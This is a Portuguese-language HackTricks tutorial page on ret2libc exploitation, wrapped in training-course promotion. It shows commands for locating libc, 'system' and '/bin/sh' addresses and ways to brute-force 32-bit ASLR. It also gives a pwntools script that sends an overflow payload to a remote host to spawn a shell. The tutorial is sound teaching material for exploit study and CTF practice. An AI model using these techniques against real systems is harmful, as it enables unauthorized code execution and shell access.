# Ret2lib

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

## **Informa√ß√µes B√°sicas**

A ess√™ncia do **Ret2Libc** √© redirecionar o fluxo de execu√ß√£o de um programa vulner√°vel para uma fun√ß√£o dentro de uma biblioteca compartilhada (por exemplo, **system**, **execve**, **strcpy**) em vez de executar shellcode fornecido pelo atacante na pilha. O atacante cria um payload que modifica o endere√ßo de retorno na pilha para apontar para a fun√ß√£o da biblioteca desejada, enquanto tamb√©m organiza para que quaisquer argumentos necess√°rios sejam configurados corretamente de acordo com a conven√ß√£o de chamada.

### **Exemplo de Passos (simplificado)**

* Obtenha o endere√ßo da fun√ß√£o a ser chamada (por exemplo, system) e o comando a ser chamado (por exemplo, /bin/sh)
* Gere uma cadeia ROP para passar o primeiro argumento apontando para a string do comando e o fluxo de execu√ß√£o para a fun√ß√£o

## Encontrando os endere√ßos

* Supondo que a `libc` utilizada seja a da m√°quina atual, voc√™ pode encontrar onde ela ser√° carregada na mem√≥ria com:

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Se voc√™ quiser verificar se o ASLR est√° mudando o endere√ßo da libc, voc√™ pode fazer:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Sabendo a libc utilizada, tamb√©m √© poss√≠vel encontrar o deslocamento para a fun√ß√£o `system` com:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Sabendo a libc utilizada, tamb√©m √© poss√≠vel encontrar o deslocamento para a string `/bin/sh` com:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Usando gdb-peda / GEF

Sabendo a libc utilizada, tamb√©m √© poss√≠vel usar Peda ou GEF para obter o endere√ßo da fun√ß√£o **system**, da fun√ß√£o **exit** e da string **`/bin/sh`** :
```
p system
p exit
find "/bin/sh"
```
### Usando /proc/\<PID>/maps

Se o processo est√° criando **filhos** toda vez que voc√™ fala com ele (servidor de rede), tente **ler** esse arquivo (provavelmente voc√™ precisar√° ser root).

Aqui voc√™ pode encontrar **exatamente onde a libc est√° carregada** dentro do processo e **onde ser√° carregada** para cada filho do processo.

![](<../../../../.gitbook/assets/image (95).png>)

Neste caso, est√° carregada em **0xb75dc000** (Este ser√° o endere√ßo base da libc)

## Libc desconhecida

Pode ser poss√≠vel que voc√™ **n√£o saiba qual libc o bin√°rio est√° carregando** (porque pode estar localizado em um servidor onde voc√™ n√£o tem acesso). Nesse caso, voc√™ poderia abusar da vulnerabilidade para **vazar alguns endere√ßos e descobrir qual biblioteca libc** est√° sendo usada:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

E voc√™ pode encontrar um template do pwntools para isso em:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

## Contornando ASLR em 32 bits

Esses ataques de for√ßa bruta s√£o **√∫teis apenas para sistemas de 32 bits**.

* Se o exploit for local, voc√™ pode tentar for√ßar o endere√ßo base da libc (√∫til para sistemas de 32 bits):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Se voc√™ estiver atacando um servidor remoto, pode tentar **for√ßar o endere√ßo da fun√ß√£o `usleep` da `libc`**, passando como argumento 10 (por exemplo). Se em algum momento o **servidor levar 10s a mais para responder**, voc√™ encontrou o endere√ßo dessa fun√ß√£o.

## One Gadget

{% content-ref url="../../one-gadget.md" %}
[one-gadget.md](../../one-gadget.md)
{% endcontent-ref %}

## Exemplo de C√≥digo x86 Ret2lib

Neste exemplo, a for√ßa bruta do ASLR est√° integrada no c√≥digo e o bin√°rio vulner√°vel est√° localizado em um servidor remoto:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Exemplo de C√≥digo

Verifique o exemplo em:

{% content-ref url="../rop-return-oriented-programing.md" %}
[rop-return-oriented-programing.md](../rop-return-oriented-programing.md)
{% endcontent-ref %}

## Ret-into-printf (ou puts)

Isso permite **vazar informa√ß√µes do processo** chamando `printf`/`puts` com alguns dados espec√≠ficos colocados como argumento.

## Ret2printf

Isso basicamente significa abusar de um **Ret2lib para transform√°-lo em uma vulnerabilidade de strings de formato `printf`** usando o `ret2lib` para chamar printf com os valores para explor√°-lo (parece in√∫til, mas √© poss√≠vel):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Outros Exemplos & refer√™ncias

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, dado um leak para o endere√ßo de uma fun√ß√£o na libc, usando um gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bits, ASLR habilitado, mas sem PIE, o primeiro passo √© preencher um overflow at√© o byte 0x00 do can√°rio para ent√£o chamar puts e vaz√°-lo. Com o can√°rio, um gadget ROP √© criado para chamar puts para vazar o endere√ßo de puts do GOT e um gadget ROP para chamar `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bits, ASLR habilitado, sem can√°rio, overflow de pilha na fun√ß√£o principal de uma fun√ß√£o filha. Gadget ROP para chamar puts para vazar o endere√ßo de puts do GOT e ent√£o chamar um gadget.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bits, sem pie, sem can√°rio, sem relro, nx. Usa a fun√ß√£o write para vazar o endere√ßo de write (libc) e chama um gadget.

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Verifique os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}
